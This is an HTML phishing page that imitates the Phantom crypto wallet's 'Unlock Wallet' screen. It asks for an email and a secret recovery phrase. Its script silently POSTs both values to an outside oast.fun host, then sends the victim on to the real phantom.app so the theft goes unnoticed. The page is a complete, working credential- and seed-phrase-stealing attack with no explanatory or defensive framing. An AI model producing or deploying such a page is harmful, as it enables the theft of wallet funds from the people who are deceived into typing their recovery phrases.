<!DOCTYPE html>
<html>
<head>
  <title>Phantom</title>
  <style>
    body { font-family: sans-serif; background: #0d0d0d; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
    .login-box { background: #1a1a1a; padding: 20px; border-radius: 10px; width: 300px; }
    input { width: 100%; padding: 10px; margin-bottom: 10px; background: #333; border: none; color: white; }
    button { width: 100%; padding: 10px; background: #512da8; border: none; color: white; border-radius: 5px; }
  </style>
</head>
<body>
  <div class="login-box">
    <h2>Unlock Wallet</h2>
    <input id="email" type="email" placeholder="Email" />
    <input id="phrase" type="text" placeholder="Secret Recovery Phrase" />
    <button onclick="submit()">Unlock</button>
  </div>

  <script>
    function submit() {
      const email = document.getElementById("email").value.trim();
      const phrase = document.getElementById("phrase").value.trim();

      fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, phrase })
      });

      // Delay before redirecting to real phantom.app
      setTimeout(() => {
        window.location.href = "https://phantom.app";
      }, 1500);
    }
  </script>
</body>
</html>
